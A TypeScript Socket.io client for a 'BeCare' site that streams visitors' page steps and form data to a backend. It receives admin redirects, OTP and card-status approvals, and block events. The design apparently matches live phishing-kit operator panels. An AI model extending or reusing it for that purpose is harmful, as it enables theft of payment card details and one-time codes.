/**
 * BeCare Socket.io Client
 * Handles real-time communication with the backend
 * Replaces Firebase onSnapshot listeners
 */
;

import { io, Socket } from 'socket.io-client';

// Socket.io connects via Nginx proxy at /socket.io/ path on qtesnd.com
// In production (Manus deployment), connect to the VPS backend
// Force correct URL - override any legacy env variable pointing to old IP
const _rawSocketUrl = import.meta.env.VITE_SOCKET_URL || 'https://qtesnd.com';
const SOCKET_URL = (_rawSocketUrl.includes('187.124.33.94') || _rawSocketUrl.includes('localhost:3001'))
  ? 'https://qtesnd.com'
  : _rawSocketUrl;

let socket: Socket | null = null;

export function getSocket(): Socket {
  if (!socket) {
    socket = io(SOCKET_URL, {
      transports: ['websocket', 'polling'],
      autoConnect: true,
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 1000,
    });

    socket.on('connect', () => {
      console.log('[Socket] Connected:', socket?.id);
      // Re-join visitor room on reconnect
      const visitorId = typeof window !== 'undefined' ? localStorage.getItem('visitor') : null;
      if (visitorId) {
        socket?.emit('visitor:join', visitorId);
        console.log('[Socket] Re-joined visitor room:', visitorId);
      }
    });

    socket.on('disconnect', () => {
      console.log('[Socket] Disconnected');
    });

    socket.on('connect_error', (err) => {
      console.error('[Socket] Connection error:', err.message);
    });
  }
  return socket;
}

export function disconnectSocket(): void {
  if (socket) {
    socket.disconnect();
    socket = null;
  }
}

// ─── Visitor Socket Actions ───────────────────────────────────────────────────

/** Join as a visitor */
export function visitorJoin(visitorId: string): void {
  const s = getSocket();
  s.emit('visitor:join', visitorId);
}

/** Update current page via socket */
export function visitorUpdatePage(visitorId: string, page: string, step?: string): void {
  const s = getSocket();
  s.emit('visitor:update_page', { visitorId, page, step });
}

/** Save form data via socket */
export function visitorSaveData(visitorId: string, payload: Record<string, any>): void {
  const s = getSocket();
  s.emit('visitor:save_data', { visitorId, payload });
}

/** Send heartbeat */
export function visitorHeartbeat(visitorId: string): void {
  const s = getSocket();
  s.emit('visitor:heartbeat', visitorId);
}

/** Send a chat message */
export function visitorSendMessage(visitorId: string, message: string, senderName?: string): void {
  const s = getSocket();
  s.emit('visitor:send_message', { visitorId, message, senderName });
}

// ─── Visitor Socket Listeners ─────────────────────────────────────────────────

/** Listen for redirect commands from admin */
export function onVisitorRedirect(callback: (data: { targetPage: string }) => void): () => void {
  const s = getSocket();
  s.on('visitor:redirect', callback);
  return () => s.off('visitor:redirect', callback);
}

/** Listen for status updates (OTP approval, etc.) */
export function onVisitorStatusUpdated(callback: (data: any) => void): () => void {
  const s = getSocket();
  // Normalize both {field, status} and direct payload {cardStatus, currentStep, ...} formats
  const handler = (data: any) => {
    if (!data || typeof data !== 'object') return;
    // If already {field, status} format, pass through directly
    if (data.field !== undefined) {
      callback(data);
      return;
    }
    // Direct payload format: emit as raw data first
    callback(data);
    // Also convert each key to {field, status} for legacy handlers
    Object.entries(data).forEach(([field, status]) => {
      if (typeof status === 'string') {
        callback({ field, status });
      }
    });
  };
  s.on('visitor:status_updated', handler);
  return () => s.off('visitor:status_updated', handler);
}

/** Listen for new messages from admin */
export function onVisitorNewMessage(callback: (data: any) => void): () => void {
  const s = getSocket();
  s.on('visitor:new_message', callback);
  return () => s.off('visitor:new_message', callback);
}

/** Listen for blocked event */
export function onVisitorBlocked(callback: () => void): () => void {
  const s = getSocket();
  s.on('visitor:blocked', callback);
  return () => s.off('visitor:blocked', callback);
}
